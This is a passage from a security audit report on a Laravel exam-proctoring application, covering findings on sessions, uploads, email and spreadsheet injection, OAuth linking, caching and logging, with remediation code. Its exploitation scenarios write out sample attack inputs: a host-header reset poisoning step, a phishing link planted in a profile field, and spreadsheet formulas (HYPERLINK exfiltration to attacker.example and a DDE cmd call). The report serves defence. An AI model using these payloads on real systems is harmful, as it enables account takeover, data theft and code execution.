composer update phpoffice/phpspreadsheet dompdf/dompdf guzzlehttp/guzzle --with-all-dependencies
composer audit                      # must exit clean

npm audit fix
npm audit --omit=dev                # production tree must be clean
```

Then publish and pin the dompdf config so the safe defaults are explicit and version-controlled:

```bash
php artisan vendor:publish --provider="Barryvdh\DomPDF\ServiceProvider"
```
```php
// config/dompdf.php — make the security posture explicit, not inherited
'options' => [
    'enable_php'    => false,   // never — PDF templates must not execute PHP
    'enable_remote' => false,   // never — blocks SSRF via <img src="http://…">
    'chroot'        => realpath(storage_path('app/private')),
],
```

Add `composer audit` and `npm audit --omit=dev` as blocking CI steps.

**Priority:** Immediate (before deployment), then continuous.

---

### 🟠 SEC-07 — Insecure session/transport configuration defaults

| | |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 7.4 — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` (estimated) |
| **CWE** | CWE-614 (Sensitive Cookie Without 'Secure'), CWE-319 (Cleartext Transmission), CWE-1004 |
| **OWASP** | A02:2021 Cryptographic Failures / A05:2021 Security Misconfiguration |
| **Status** | ✅ Verified |

**Affected files**
- `config/session.php:172` — `'secure' => env('SESSION_SECURE_COOKIE')` → **defaults to `null`** (falsy)
- `config/session.php:50` — `'encrypt' => env('SESSION_ENCRYPT', false)`
- `.env.example:35` — `SESSION_ENCRYPT=false`; no `SESSION_SECURE_COOKIE` key at all
- `.env.example:2,4` — `APP_ENV=local`, `APP_DEBUG=true`
- `bootstrap/app.php` — no `$middleware->trustProxies(...)`, no `$middleware->trustHosts(...)`
- No `URL::forceScheme('https')` anywhere in the codebase

**Risk description**

| Issue | Detail |
|---|---|
| **Secure flag absent** | With `SESSION_SECURE_COOKIE` unset, the session cookie is transmitted over plain HTTP. Any downgrade — a `http://` link, a captive portal, an SSL-stripping proxy on venue Wi-Fi — leaks the session identifier. |
| **No trusted proxies** | Behind a load balancer or reverse proxy (the normal government hosting shape), `$request->secure()` returns `false` because `X-Forwarded-Proto` is not honoured. This suppresses the Secure flag, breaks HSTS emission, and — critically — makes `request()->ip()` return the *proxy's* address. That IP is written to the audit log (`AuthenticatedSessionController:147`), the login throttle key (line 47), and assignment-confirmation records. **All rate limiting collapses to a single shared bucket, and the audit trail records the proxy for every event.** |
| **No trusted hosts** | Host-header injection can poison absolute URLs, including password-reset links generated by `Password::sendResetLink` — a classic account-takeover primitive. |
| **`.env.example` ships debug on** | `composer setup` copies `.env.example` → `.env`. A deployer following the documented setup path gets `APP_ENV=local` and `APP_DEBUG=true` in production, exposing full stack traces, environment variables and DB credentials through Ignition-style error pages. `bootstrap/app.php:65` explicitly returns the raw debug response when `config('app.debug')` is true. |

**Exploitation scenario (host-header → account takeover)**
1. Attacker sends `POST /forgot-password` with `Host: attacker.example`.
2. With no `TrustHosts`, Laravel builds the reset URL from the request host.
3. The victim receives a genuine CSC-branded email whose reset link points at the attacker's domain.
4. The victim clicks; the reset token is delivered to the attacker, who redeems it at the real site.

**Remediation**

```php
// bootstrap/app.php
->withMiddleware(function (Middleware $middleware): void {
    $middleware->trustProxies(
        at: ['10.0.0.0/8', '172.16.0.0/12'],   // the actual LB/proxy CIDRs — never '*'
        headers: Request::HEADER_X_FORWARDED_FOR
            | Request::HEADER_X_FORWARDED_HOST
            | Request::HEADER_X_FORWARDED_PORT
            | Request::HEADER_X_FORWARDED_PROTO,
    );

    $middleware->trustHosts(at: ['proctad.csc.gov.ph']);
    // …existing config
})
```

```php
// AppServiceProvider::boot()
if ($this->app->environment('production')) {
    URL::forceScheme('https');
}
```

Ship a separate `.env.production.example` with safe defaults, and make `.env.example` safe too:

```dotenv
APP_ENV=production
APP_DEBUG=false
SESSION_SECURE_COOKIE=true
SESSION_ENCRYPT=true
SESSION_SAME_SITE=strict     # 'lax' only if a cross-site OAuth return breaks
SESSION_LIFETIME=30          # 120 min is long for a system holding PII
```

`app/Console/Commands/Preflight.php` already exists as a deployment-check command — extend it to hard-fail on `APP_DEBUG=true`, missing `SESSION_SECURE_COOKIE`, or a default `APP_KEY`.

**Priority:** Immediate.

---

### 🟡 SEC-08 — Uploaded images served inline from the application origin without `nosniff`

| | |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.4 — `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (estimated) |
| **CWE** | CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-79 (Stored XSS) |
| **OWASP** | A03:2021 Injection |
| **Status** | ⚠️ Plausible — conditional on browser sniffing behaviour |

**Affected files**
- `app/Http/Controllers/MemberController.php:294-301` — `photo()`, `Storage::disk('local')->response($member->photo_path)`
- `app/Http/Controllers/OtherExaminationPersonnelController.php:295` (route) — same pattern
- `app/Http/Requests/StoreMemberRequest.php:41`, `UpdateOwnProfileRequest.php:28`, `StoreOtherExaminationPersonnelRequest.php:46` — `['nullable', 'image', 'max:2048']`

**Risk description**
Member photos are validated with the bare `image` rule and served **inline** (`Storage::response()`, not `download()`) from the application's own origin, with no `X-Content-Type-Options: nosniff` (SEC-03).

*Verified mitigating factor:* Laravel 13's `image` rule **excludes SVG by default** — `vendor/laravel/framework/.../ValidatesAttributes.php:1506` adds `svg` to the accepted MIME list only when the `allow_svg` parameter is passed, which this codebase never does. The direct `<svg onload=…>` stored-XSS path is therefore closed.

The residual risk is a **polyglot file** — a valid JPEG/PNG whose bytes also parse as HTML. Served inline, same-origin, with no `nosniff` header, a sniffing browser may render it as a document, executing script under `proctad.csc.gov.ph` with the victim's session cookie.

**Exploitation scenario**
1. A member uploads a crafted GIF/HTML polyglot as their profile photo via `PUT /my/profile`.
2. A Field Office administrator opens the member's record; `GET /members/{id}/photo` returns the file inline.
3. If the browser sniffs the content as HTML, script runs in the admin's session, in the application origin — full account takeover from a self-service upload.

**Remediation**

1. `X-Content-Type-Options: nosniff` globally (SEC-03) — this alone closes the sniffing path.
2. Pin the content type explicitly and add a defensive CSP on the file response:
```php
public function photo(Member $member): StreamedResponse
{
    Gate::authorize('view', $member);
    abort_unless($member->photo_path && Storage::disk('local')->exists($member->photo_path), 404);

    return Storage::disk('local')->response($member->photo_path, headers: [
        'X-Content-Type-Options' => 'nosniff',
        'Content-Security-Policy' => "default-src 'none'; sandbox",
        'Content-Disposition' => 'inline',
    ]);
}
```
3. Constrain validation beyond the generic rule, and re-encode on upload to strip any non-image payload:
```php
'photo' => ['nullable', 'image', 'mimes:jpg,jpeg,png,webp', 'max:2048',
            'dimensions:max_width=4000,max_height=4000'],
```
4. Consider serving user uploads from a separate cookieless origin (e.g. `files.proctad.csc.gov.ph`), which makes this class of finding structurally impossible.

**Priority:** Short-term (immediate once SEC-03 lands, which mitigates it).

---

### 🟡 SEC-09 — HTML injection into outbound email via unescaped template substitution

| | |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (estimated) |
| **CWE** | CWE-80 (Improper Neutralization of Script-Related HTML Tags) |
| **OWASP** | A03:2021 Injection |
| **Status** | ✅ Verified |

**Affected files**
- `app/Models/EmailTemplate.php:29-44` — `render()`
- `app/Mail/TemplatedMail.php:36` — `new Content(htmlString: $this->rendered['html'])`

**Risk description**
`render()` substitutes `{placeholder}` tokens into `body_html` via `preg_replace_callback` with **no escaping**, and the result is passed to Mailable as a raw `htmlString`. Substituted values include member-controlled fields — name, agency, position — which members edit themselves through `PUT /my/profile`.

**Exploitation scenario**
A member sets their `agency` to `<a href="https://attacker.example/reset">Click here to confirm your assignment</a>`. When a Field Office triggers `POST /assignments/{id}/send-confirmation`, the resulting email — sent from the genuine CSC mail server, passing SPF/DKIM, bearing CSC branding — contains an attacker-controlled link. This is a high-credibility phishing primitive.

The rendered body is also persisted to `email_logs.body_html` and re-served as JSON by `EmailLogController::show()` (line 29), so any client that renders it becomes a second sink.

**Remediation**

```php
// app/Models/EmailTemplate.php
public function render(array $data): array
{
    // Substituted values are member-controlled (name, agency, position). Escape
    // for the HTML body; leave the plain-text body and subject unescaped, since
    // entity-encoding there would surface as literal "&amp;" to the reader.
    $replace = fn (?string $text, bool $escape): ?string => $text === null
        ? null
        : preg_replace_callback(
            '/\{(\w+)\}/',
            fn (array $m) => isset($data[$m[1]])
                ? ($escape ? e($data[$m[1]]) : $data[$m[1]])
                : $m[0],
            $text,
        );

    return [
        // Strip CR/LF defensively: a newline in a subject is the classic
        // header-injection primitive, even though Symfony Mailer also rejects it.
        'subject' => str_replace(["\r", "\n"], '', (string) $replace($this->subject, false)),
        'html'    => $replace($this->body_html, true),
        'plain'   => $replace($this->body_plain, false),
    ];
}
```

**Priority:** Short-term.

---

### 🟡 SEC-10 — Spreadsheet formula injection in report exports

| | |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 6.3 — `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` (estimated) |
| **CWE** | CWE-1236 (Improper Neutralization of Formula Elements in a CSV File) |
| **OWASP** | A03:2021 Injection |
| **Status** | ✅ Verified |

**Affected files**
- `app/Exports/MembersExport.php:30-44` — `map()` emits `name`, `agency`, `position`, `email` unmodified
- `app/Exports/ServiceRecordsExport.php`, `TrainingAttendanceExport.php`, `RoomAssignmentsExport.php` — same pattern
- Routes: `routes/web.php:264-268`, plus `my.service-history.export`, `members.service-history.export`

**Risk description**
Member-controlled string fields flow into `.xlsx` cells with no neutralisation. A value beginning with `=`, `+`, `-`, `@`, tab or CR is interpreted as a formula by Excel and LibreOffice. Excel's DDE surface (`=cmd|'/c calc'!A1`) and `HYPERLINK`/`WEBSERVICE` exfiltration both apply.

**Exploitation scenario**
A member sets `agency` to `=HYPERLINK("https://attacker.example/?d="&A1&B1&C1,"Click to view record")`. A Field Office administrator exports the members report and opens it. Excel renders a benign-looking link that, when clicked, exfiltrates adjacent row data — names, emails, mobile numbers — to the attacker. With DDE enabled (still common on government desktop images), `=cmd|…` can achieve code execution on the administrator's workstation.

**Business impact:** Pivot from a low-privilege member account to a staff workstation inside the CSC network.

**Remediation**

Neutralise at the export boundary — a shared concern, since five exports share the flaw:

```php
// app/Exports/Concerns/EscapesFormulas.php
namespace App\Exports\Concerns;

trait EscapesFormulas
{
    /**
     * Prefix a single quote onto anything a spreadsheet would evaluate.
     * Excel and LibreOffice both treat the leading quote as "this is text",
     * and it is not displayed to the reader.
     */
    protected function safe(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        return preg_match('/^[=+\-@\t\r]/', $value) ? "'".$value : $value;
    }
}
```

```php
// app/Exports/MembersExport.php
use EscapesFormulas;

public function map($member): array
{
    return array_map($this->safe(...), [
        $member->proctad_id,
        $member->name,
        ucfirst($member->sex),
        $member->email,
        $member->mobile_number,
        $member->agency,
        $member->position,
        $member->fieldOffice?->name,
        $member->status->label(),
        $member->created_at->format('Y-m-d'),
    ]);
}
```

Apply the trait to all four `App\Exports\*` classes.

**Priority:** Short-term.

---

### 🟡 SEC-11 — OAuth account linking by unverified email address

| | |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.9 — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` (estimated) |
| **CWE** | CWE-287 (Improper Authentication) |
| **OWASP** | A07:2021 Identification and Authentication Failures |
| **Status** | ✅ Verified (code path); exploitability depends on the OAuth client's domain restrictions |

**Affected file / function:** `app/Http/Controllers/Auth/GoogleAuthController.php:47-49` — `callback()`

```php
$user = User::where('google_id', $googleUser->getId())
    ->orWhere('email', $googleUser->getEmail())     // ← links on email alone
    ->first();
```

**Risk description**
An existing account is matched — and then signed into, with `remember: true` (line 98) — on **email equality alone**, with no check of Google's `email_verified` claim and no confirmation step. Socialite exposes this claim as `$googleUser->user['email_verified']`; it is not consulted.

Google Workspace accounts on a domain the attacker controls can be created with any local part. If a CSC staff account exists at, say, `jdelacruz@csc.gov.ph`, the attack requires control of `csc.gov.ph` (not feasible). But the user table also holds **self-registered member accounts on public and agency domains** — and any domain an attacker can register a Workspace tenant on becomes a takeover vector for the matching ProCTAD account.

The linking is also silently persistent: line 84 writes `google_id` onto the matched account, so the association survives.

**Exploitation scenario**
1. Attacker identifies a member account at `victim@somedomain.ph`.
2. Attacker registers/controls `somedomain.ph`, creates a Google Workspace tenant, provisions the mailbox `victim@`.
3. Attacker signs in with Google. The `orWhere('email', …)` matches the existing ProCTAD account; `Auth::login($user, remember: true)` grants a persistent session.
4. Full access to the victim's PROCTAD record, service history, certificates and assignments.

**Remediation**

```php
// GoogleAuthController::callback()
$googleUser = Socialite::driver('google')->user();

// Google's own verification is the only thing that makes the email a safe
// identity key. Without it, anyone who can provision a mailbox on any domain
// can claim the matching ProCTAD account.
if (($googleUser->user['email_verified'] ?? false) !== true) {
    Log::warning('Google sign-in rejected: unverified email', [
        'google_id' => $googleUser->getId(),
    ]);

    return redirect()->route('member.login')
        ->with('error', 'Your Google account email is not verified. Please verify it with Google and try again.');
}

// Match on the provider identifier first. Fall back to email only when the
// local account has no Google identity yet — and never for a staff account,
// which must be linked deliberately by an administrator.
$user = User::where('google_id', $googleUser->getId())->first()
    ?? User::where('email', $googleUser->getEmail())
        ->whereNull('google_id')
        ->where('role', UserRole::Member)
        ->first();
```

Additionally, reconsider `remember: true` on line 98 — an unconditional long-lived remember cookie on every Google sign-in widens the window for any session compromise. Make it opt-in, as the password path does (`$request->boolean('remember')`, `AuthenticatedSessionController:80`).

**Priority:** Short-term.

---

### 🟡 SEC-12 — Service worker caches authenticated pages; not purged on logout

| | |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.5 — `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (estimated) |
| **CWE** | CWE-524 (Use of Cache Containing Sensitive Information), CWE-525 (Use of Web Browser Cache Containing Sensitive Information) |
| **OWASP** | A04:2021 Insecure Design |
| **Status** | ✅ Verified |

**Affected files**
- `public/sw.js:35` — `OFFLINE_DOC_PATHS = [/^\/scanner(\/|$)/, /^\/scan\//]`
- `public/sw.js:98-117` — `handleNavigation()`, caches successful navigations into `DOC_CACHE`
- `app/Http/Controllers/Auth/AuthenticatedSessionController.php:108-120` — `destroy()`; no client cache invalidation

**Risk description**
`/scanner` is an authenticated staff route (`role:super_admin,esd_admin,fo_admin,field_director`). Its HTML embeds the full Inertia prop payload: the scanned member's name, PROCTAD ID, agency, membership status, venue, room, designation, and — when scanned during an examination — their entire `service_history` (`ScannerController:139`).

`handleNavigation()` writes that response body into a persistent Cache Storage entry. Nothing removes it: `destroy()` invalidates the server session but issues no `Clear-Site-Data` header and posts no message to the service worker. The cached HTML — with its PII — survives logout indefinitely, on a device that on exam day is very often a **shared venue phone**.

`cache.match(request, { ignoreSearch: true })` (line 111) widens this further: a cached response for one scanned member is served for *any* query string on that path, so an offline reboot can surface the previous operator's last scan result.

**Exploitation scenario**
Exam day; one shared phone passed between proctors. Operator A scans members and logs out. Operator B — or anyone who later picks up the phone — puts it in airplane mode and navigates to `/scanner`. The service worker serves the cached document, rendering Operator A's last scan result, including that member's service history, with no session required.

**Remediation**

1. **Never cache authenticated document responses.** The offline requirement is that the *app shell* boots — not that a previous member's record is preserved:

```js
// public/sw.js — cache the shell, never the payload
async function handleNavigation(request, url) {
    const cacheable = OFFLINE_DOC_PATHS.some((pattern) => pattern.test(url.pathname));

    try {
        return await fetch(request);
    } catch (error) {
        if (cacheable) {
            const shell = await caches.open(SHELL_CACHE);
            // A dedicated, prop-free offline shell — the scanner boots empty
            // and replays its queue, rather than resurrecting someone's record.
            const cached = await shell.match('/scanner-offline.html');
            if (cached) return cached;
        }

        const shell = await caches.open(SHELL_CACHE);
        return (await shell.match('/offline.html')) || Response.error();
    }
}
```

2. Purge caches and the scan queue on logout:

```js
// resources/js/app.js — on logout success
navigator.serviceWorker?.controller?.postMessage('purge-caches');
```
```js
// public/sw.js
self.addEventListener('message', (event) => {
    if (event.data === 'skip-waiting') self.skipWaiting();
    if (event.data === 'purge-caches') {
        event.waitUntil(caches.delete(DOC_CACHE));
    }
});
```

3. Emit `Clear-Site-Data` on logout as a belt-and-braces measure:

```php
// AuthenticatedSessionController::destroy()
return redirect('/')->withHeaders([
    'Clear-Site-Data' => '"cache", "storage"',
]);
```

4. Review `resources/js/Composables/useScanQueue.js` — queued scans in `localStorage` carry PROCTAD IDs and are also not cleared at logout.

**Priority:** Short-term (before the next examination cycle).

---

### 🟡 SEC-13 — Rendered email bodies containing live signed links retained indefinitely

| | |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 4.9 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N` (estimated) |
| **CWE** | CWE-532 (Insertion of Sensitive Information into Log File), CWE-922 (Insecure Storage of Sensitive Information) |
| **OWASP** | A09:2021 Security Logging and Monitoring Failures |
| **Status** | ✅ Verified |

**Affected files**
- `app/Http/Controllers/EmailLogController.php:26-37` — returns `body_html` verbatim
- `app/Services/AssignmentConfirmationSender.php:52-56` — `URL::temporarySignedRoute('assignments.confirm', now()->addDays(7), …)`
- `app/Console/Commands/PruneOldLogs.php` / `routes/console.php:13` — monthly prune

**Risk description**
`NotificationMailer` persists the fully rendered HTML body of each sent email into `email_logs.body_html`. For assignment confirmations, that body contains a **live signed URL** — a bearer credential valid for 7 days that authorises confirming or declining an assignment on the member's behalf, with no login.

The controller's own docblock acknowledges the sensitivity ("these bodies contain recipients' names and signed links"), and access is correctly restricted to `super_admin,esd_admin`. The gap is retention and defence-in-depth: any read access to the `email_logs` table — a compromised admin account, a database backup, a support query, a DBA — yields working credentials for every assignment confirmation sent in the last 7 days.

**Remediation**

1. Redact signed URLs before persisting the body:
```php
// App\Services\NotificationMailer — before writing the log row
$storedHtml = preg_replace(
    '/(\?|&)(signature|expires)=[^"&\s]+/i',
    '$1$2=[redacted]',
    $renderedHtml,
);
```
2. Shorten the assignment-link lifetime. Seven days is generous for an operational confirmation; 72 hours reduces the exposure window by more than half with little practical cost.
3. Enforce a retention window on `email_logs` in `PruneOldLogs` (e.g. 90 days for bodies, longer for metadata), and document it in the RA 10173 records-retention schedule.

**Priority:** Short-term.

---

### 🟡 SEC-14 — Login responses disclose account state (user enumeration)

| | |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (estimated) |
| **CWE** | CWE-204 (Observable Response Discrepancy) |
| **OWASP** | A07:2021 Identification and Authentication Failures |
| **Status** | ✅ Verified |

**Affected file:** `app/Http/Controllers/Auth/AuthenticatedSessionController.php:58-76`

**Risk description**
Before any credential is checked, `store()` returns four distinct messages:

| Condition | Message | Discloses |
|---|---|---|
| Locked | *"This account is temporarily locked. Try again after 3:47 PM."* | Account exists; **and the exact lockout expiry** |
| Inactive | *"This account has been deactivated…"* | Account exists |
| Blacklisted | *"This account has been blacklisted…"* | Account exists **and the member is blacklisted** — a sensitive administrative fact |
| Bad credentials | *"These credentials do not match our records."* | — |

All three state messages are returned **without a valid password**. An attacker submitting a garbage password enumerates valid usernames/emails, and learns which members are blacklisted — an adverse administrative status disclosed to anyone who can guess an email address.

Note the contrast: `PasswordResetLinkController::store()` (line 33-40) correctly returns a constant response and documents why. The login path does not follow the same discipline.

**Exploitation scenario**
Attacker feeds the 185 email addresses harvested from SEC-02 into `POST /login` with a dummy password. The response distinguishes live from dead accounts, and flags blacklisted members. The per-identifier throttle (`$throttleKey = login|ip`, line 47) does not impede this: each address is a fresh bucket, and the attacker gets 5 attempts per address per minute — far more than the one needed.

**Remediation**

Check credentials **first**, then apply state checks to the authenticated identity:

```php
public function store(Request $request): RedirectResponse
{
    $request->validate([
        'login' => ['required', 'string'],
        'password' => ['required', 'string'],
    ]);

    $throttleKey = mb_strtolower($request->string('login')).'|'.$request->ip();

    if (RateLimiter::tooManyAttempts($throttleKey, self::MAX_FAILED_ATTEMPTS)) {
        throw ValidationException::withMessages([
            'login' => __('auth.throttle', ['seconds' => RateLimiter::availableIn($throttleKey)]),
        ]);
    }

    $field = filter_var($request->string('login'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
    $user  = User::where($field, $request->string('login'))->first();

    // Credentials first. Every account-state message below confirms the account
    // exists, so none of them may be reachable without a correct password.
    if (! $user || ! Auth::attempt(
        [$field => $request->string('login'), 'password' => $request->string('password')],
        $request->boolean('remember'),
    )) {
        RateLimiter::hit($throttleKey, 60);
        $this->recordFailure($user);

        throw ValidationException::withMessages([
            'login' => __('These credentials do not match our records.'),
        ]);
    }

    // Authenticated — now it is safe to explain why they still cannot proceed.
    if ($user->locked_until?->isFuture() || ! $user->is_active
        || $user->member?->blacklists()->where('status', BlacklistStatus::Active)->exists()) {
        Auth::guard('web')->logout();
        $request->session()->invalidate();

        throw ValidationException::withMessages([
            // One message for all three states: an attacker who has the password
            // already owns the account, and the member can call their Field
            // Office, who can see the real reason.
            'login' => __('This account is not currently able to sign in. Please contact your Field Office.'),
        ]);
    }

    // …existing success path
}
```

Also drop the exact unlock time from the message — `"Try again later"` is sufficient for the user and gives an attacker no timing oracle.

**Priority:** Short-term.

---

### 🟡 SEC-15 — Weak password policy for a government system holding PII

| | |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` (estimated) |
| **CWE** | CWE-521 (Weak Password Requirements) |
| **OWASP** | A07:2021 Identification and Authentication Failures |
| **Status** | ✅ Verified |

**Affected file:** `app/Providers/AppServiceProvider.php:28`

```php
Password::defaults(fn () => Password::min(8)->letters()->numbers());
```

**Risk description**
Eight characters, letters and digits, with **no breach check**. `password1`, `csc12345` and `proctad1` all pass. There is no MFA anywhere in the codebase, so the password is the sole factor for every staff account with access to the regional member registry. Given SEC-02 establishes that the legacy estate used a single shared password, the realistic password distribution here is weak.

Laravel ships `uncompromised()`, which checks the Have I Been Pwned k-anonymity API — it is not enabled.

**Remediation**

```php
// AppServiceProvider::boot()
Password::defaults(function () {
    // 12 chars + a breach check. Staff accounts reach the regional member
    // registry (PII under RA 10173) with a password as the only factor, so
    // the floor should sit above the 8-char convention.
    $rule = Password::min(12)->letters()->numbers()->mixedCase()->uncompromised();

    return $this->app->isProduction() ? $rule : Password::min(8);
});
```

Increase `BCRYPT_ROUNDS` from 12 to 13 if the hosting CPU budget allows.

**MFA readiness:** no TOTP/WebAuthn support exists. For a government system whose privileged roles can approve certificates and export the full member registry, MFA on `super_admin`, `esd_admin`, `director_iv`, `director_iii` and `field_director` should be treated as a short-term roadmap item, not a nice-to-have. `laravel/fortify` provides TOTP with minimal integration effort against the existing session guard.

**Priority:** Short-term.

---

### 🔵 SEC-16 — Authorization split between hardcoded route roles and a runtime-editable permission matrix

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-1220 (Insufficient Granularity of Access Control) |
| **OWASP** | A01:2021 Broken Access Control |
| **Status** | ✅ Verified (design observation) |

**Affected files:** `routes/web.php:203-460` (hardcoded `role:` lists); `app/Support/PermissionRegistry.php`; `app/Policies/*.php`

Access is decided in two independent places: static role lists in the route file, and a database-backed, admin-editable permission matrix consulted by the policies. They can disagree. A super admin who grants `MembersManage` to a new role via `PUT /role-permissions` will find the policy allows it while the route middleware still denies it — or, more dangerously in a future refactor, the reverse.

Today this fails **closed** (both gates must pass), which is the safe direction. The risk is drift: a route added without its `role:` middleware silently falls back to whatever the matrix says, and the matrix is editable at runtime by a non-developer.

**Remediation:** Make the policy the single source of truth. Replace the `role:` route lists with `can:` middleware bound to the same `Permission` enum, so route and policy cannot diverge:
```php
Route::middleware('can:viewAny,App\Models\Member')->group(function () { … });
```
Add a test asserting every non-public route carries either `auth` + a `can:`/policy check, so a route added without authorization fails CI.

---

### 🔵 SEC-17 — `UserPolicy::update()` ignores the target user

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **Status** | ✅ Verified |

**Affected files:** `app/Policies/UserPolicy.php:20-23`; `app/Http/Controllers/UserController.php:89-111`

```php
public function update(User $user, User $target): bool
{
    return $this->manage($user);   // $target never consulted
}
```

`UserController::update()` accepts `'role' => ['required', Rule::enum(UserRole::class)]` with no ceiling, so any principal reaching this endpoint can set any user — including themselves — to `super_admin`. Today the route is `role:super_admin`-gated, so the escalation is from super admin to super admin: not exploitable. It is nonetheless a missing guard that a single route-middleware change would turn into a real vertical escalation.

**Remediation**
```php
public function update(User $actor, User $target): bool
{
    if (! $this->manage($actor)) {
        return false;
    }

    // Nobody edits an account at or above their own tier but themselves, and
    // nobody grants a role they do not themselves hold.
    return $actor->id === $target->id
        || $actor->role->outranks($target->role);
}
```
```php
// UserController::update() — cap the grantable role
'role' => ['required', Rule::enum(UserRole::class),
           Rule::in($request->user()->role->grantableRoles())],
```
Also add the mirror of the existing self-deactivation guard (line 100): prevent a super admin from demoting their own role, which can strand the system with no super admin.

---

### 🔵 SEC-18 — Sensitive attributes written to the audit trail

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-532 (Insertion of Sensitive Information into Log File) |
| **Status** | ✅ Verified |

**Affected file:** `app/Models/Concerns/Auditable.php:14,54-57`

```php
private const AUDIT_HIDDEN = ['password', 'remember_token', 'created_at', 'updated_at'];
```

The redaction list correctly covers credentials, but every other attribute is written verbatim into `audit_logs.changes`. For `Member`, that includes `email`, `mobile_number` and `date_of_birth` — the last of which is deliberately `encrypted` at rest on the model (`Member.php:38`), yet lands in the audit log as whatever value passed through `getChanges()`. For `ScannerSession` (which also uses the trait), the `token` — the sole credential for the public scanner link — is written to the log on creation.

**Remediation**
```php
// app/Models/Concerns/Auditable.php
private const AUDIT_HIDDEN = [
    'password', 'remember_token', 'created_at', 'updated_at',
    // Bearer credentials — a log row must never be usable as one.
    'token', 'google_id',
];

/** Recorded as changed, but with the value masked: PII under RA 10173. */
private const AUDIT_MASKED = ['date_of_birth', 'mobile_number', 'email'];

protected function auditAttributes(array $attributes): array
{
    $visible = array_diff_key($attributes, array_flip(self::AUDIT_HIDDEN));

    foreach (self::AUDIT_MASKED as $key) {
        if (array_key_exists($key, $visible)) {
            $visible[$key] = '[redacted]';
        }
    }

    return $visible;
}
```
Consider allowing each model to declare its own hidden/masked sets, rather than one global list across 31 models.

---

### 🔵 SEC-19 — No security event logging or alerting

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-778 (Insufficient Logging) |
| **OWASP** | A09:2021 Security Logging and Monitoring Failures |
| **Status** | ✅ Verified |

`AuditLog` records `login`, `login_failed`, `account_locked`, `password_reset`, `password_changed` and `password_reset_sent` — a good foundation, better than most. What is missing is anything that *reacts*:

- No alerting on lockout bursts, mass export, or bulk approval
- No logging of authorization failures (403s from `EnsureUserHasRole` or policy denials) — the single most useful signal for detecting an authenticated attacker probing for privilege escalation
- `config/logging.php:64` sets `LOG_LEVEL=debug` by default, and `.env.example:22` ships `LOG_LEVEL=debug`
- The `single` channel writes one unbounded `laravel.log`; `daily` with retention is configured but not the default
- `PruneOldLogs` runs monthly, but nothing defines a retention period for `audit_logs` — a compliance question under RA 10173

**Remediation**
```php
// AppServiceProvider::boot()
Gate::after(function ($user, $ability, $result) {
    if ($result === false) {
        Log::channel('security')->warning('Authorization denied', [
            'user_id' => $user?->id,
            'role'    => $user?->role?->value,
            'ability' => $ability,
            'path'    => request()->path(),
            'ip'      => request()->ip(),
        ]);
    }
});
```
Set `LOG_LEVEL=warning` and `LOG_STACK=daily` for production; add a dedicated `security` channel with a longer retention than the application log; define and document an `audit_logs` retention period.

---

### 🔵 SEC-20 — Unbounded resource consumption on report and export endpoints

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption), CWE-770 (Allocation Without Limits) |
| **Status** | ✅ Verified |

**Affected files**
- `app/Http/Controllers/ReportController.php:37-45` — `->get()` on the full `ExamAssignment` set with three eager-loaded relations, no pagination
- `app/Exports/MembersExport.php:17-23` — `->get()` on the entire member table into memory
- `app/Http/Controllers/DuplicateMembersController.php:46-56` — an N+1: a `whereRaw` query per duplicate group
- Routes `reports.export.*`, `examinations.reports.*` — no `throttle` middleware

A region-wide role can request an unfiltered export of every member and every service record synchronously, in-process. Repeated concurrent requests exhaust PHP-FPM workers. `MembersExport` should use `FromQuery` with chunking rather than `FromCollection`.

*Mitigating factor:* the codebase shows awareness of this class of issue — `MemberController::downloadIdCardBulk` (line 314) explicitly bounds its input, with a comment explaining that an unbounded list previously rendered an ID card for every member in one request. The same discipline has not reached the report exports.

**Remediation**
- `throttle:5,1` on all export routes
- Convert exports to `FromQuery` + `WithChunkReading` (maatwebsite supports both)
- Queue any export over a threshold and email the finished file
- Pre-aggregate `ReportController::index` with `withCount`/`selectRaw` instead of hydrating every assignment

---

### 🔵 SEC-21 — Scanner session token is a long-lived path parameter stored in plaintext

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-598 (Use of GET Request Method With Sensitive Query Strings), CWE-522 (Insufficiently Protected Credentials) |
| **Status** | ✅ Verified |

**Affected files:** `app/Models/ScannerSession.php:39-42`; `routes/web.php:92-102`

The design here is sound — 40 characters of `Str::random`, expiry capped at one week (`ScannerSessionController:41`), revocable, per-token rate limiting, and the public view deliberately withholds employment and membership status (`ScannerController:113-117`). The residual concerns are modest:

- The token appears in the **URL path**, so it lands in web-server access logs, any reverse-proxy log, and browser history on shared venue phones.
- It is stored **plaintext** in `scanner_sessions.token`, so database read access yields working scanner links for every active session.
- `ResolveScannerSession:23-24` looks it up with a plain `where('token', …)` — a non-constant-time comparison, though the 40-character random space makes timing analysis impractical.

